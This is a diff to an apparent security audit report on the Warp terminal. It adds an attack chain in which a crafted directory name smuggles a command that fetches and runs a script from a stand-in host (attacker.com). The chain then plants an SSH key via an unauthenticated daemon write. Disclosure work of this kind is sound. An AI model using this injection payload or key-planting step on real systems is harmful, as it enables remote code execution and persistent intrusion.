@@ -10,7 +10,7 @@
 
 ## Executive Summary
 
-This security audit of the Warp terminal application identified **9 Critical** and **14 High** severity vulnerabilities across authentication, encryption, IPC, AI integration, remote server, auto-update, and supply-chain components. Additionally, **3 vulnerability chains** demonstrate how individual findings combine into critical end-to-end attack scenarios. The most severe findings allow:
+This security audit of the Warp terminal application identified **9 Critical** and **14 High** severity vulnerabilities across authentication, encryption, IPC, AI integration, remote server, auto-update, and supply-chain components. Additionally, **4 vulnerability chains** demonstrate how individual findings combine into critical end-to-end attack scenarios with live evidence. The most severe findings allow:
 
 1. **Offline decryption of all stored credentials** via static encryption key
 2. **Unauthenticated arbitrary file write/delete** on remote server daemon
@@ -20,6 +20,7 @@ This security audit of the Warp terminal application identified **9 Critical** a
 6. **Binary replacement** via unsigned Linux AppImage auto-update
 7. **RCE via malicious repository** through MCP working_directory injection
 8. **Code execution via supply-chain** through unsigned tmux installer and LD_LIBRARY_PATH
+9. **Remote server persistent compromise** via SSH command injection chained with daemon auth bypass
 
 All vulnerabilities have been verified against source code at the audited commit. Proof-of-concept verification scripts are provided in the `exploits/` directory.
 
@@ -848,6 +849,35 @@ The following chains demonstrate how individual vulnerabilities combine into cri
 7. Poisoning persists for lifetime of Warp session (hours/days)
 
 **Impact:** Single directory navigation permanently compromises developer toolchain.
+
+---
+
+### CHAIN-004: Remote Server Compromise via SSH Injection + Daemon Auth Bypass
+
+| Contributing Vulnerabilities | Combined Severity |
+|------------------------------|-------------------|
+| VULN-006 (SSH Command Injection) + VULN-005 (Remote Daemon Auth Bypass) | CRITICAL |
+
+**Attack Flow:**
+1. Attacker creates directory with malicious name: `repo'&&curl attacker.com/pwn.sh|sh&&echo'`
+2. User opens SSH session in Warp and navigates to this directory
+3. **VULN-006:** Warp builds `cd '{cwd}' && cmd` — single quote in name breaks quoting context
+4. Shell parses `&&` as command separator — attacker payload executes on remote host
+5. Payload locates Warp daemon socket at `~/.warp/remote-server/*/server.sock`
+6. **VULN-005:** Payload sends `WriteFile` to daemon — no `auth_token` verification required
+7. Attacker's SSH key written to `~/.ssh/authorized_keys`
+8. Persistent SSH access established to remote host
+
+**Source Evidence:**
+- `remote_command_executor.rs:60`: `cd '{current_directory_path}' && ` — no quote escaping
+- `server_model.rs:914-990`: `handle_write_file` accepts path without auth_token check
+
+**Impact:** Single `cd` into malicious directory gives attacker persistent SSH access to any remote host.
+
+**Live Demo Evidence:**
+- `evidence/chain004_inject.log` — Proves command injection executed
+- `evidence/chain004_authorized_keys` — Proves WriteFile bypassed auth
+- `evidence/chain004_proof.json` — Structured JSON with `CHAIN004_PROOF_CONFIRMED`
 
 ---
 
